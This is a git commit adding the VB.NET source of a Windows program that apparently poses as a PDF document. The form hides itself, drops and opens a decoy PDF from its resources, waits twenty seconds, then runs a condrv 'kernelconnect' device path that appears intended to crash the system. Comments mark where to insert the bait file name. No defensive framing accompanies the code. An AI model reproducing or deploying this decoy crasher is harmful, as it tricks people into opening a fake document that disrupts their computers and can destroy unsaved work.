eabf2b43c7c3d6e5d558abe008b588db13024826
swagkarna <46685308+swagkarna@users.noreply.github.com>
2021-01-27 16:11:15 +0530

    Add files via upload

---
+++ Exe File Source Code/Form1.vb
@@ -0,0 +1,31 @@
+﻿Imports System.IO
+
+
+Public Class Form1
+    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+        Me.Hide()
+        Me.Opacity = 0
+        Me.ShowInTaskbar = False
+
+        Dim Ressourcl() As Byte = My.Resources.sample
+
+
+
+        FileOpen(1, Environ("tmp") & "\sample.pdf", OpenMode.Binary) 'here insert PDF file name
+        FilePut(1, Ressourcl)
+        FileClose(1)
+        Dim file As String = Environ("tmp") & "\sample.pdf" 'here insert PDF file name
+        Dim process As Process = Process.Start(file)
+
+        System.Threading.Thread.Sleep(20000)
+
+        Dim command = "\\.\globalroot\device\condrv\kernelconnect"
+        Shell(command)
+
+
+
+
+    End Sub
+
+
+End Class
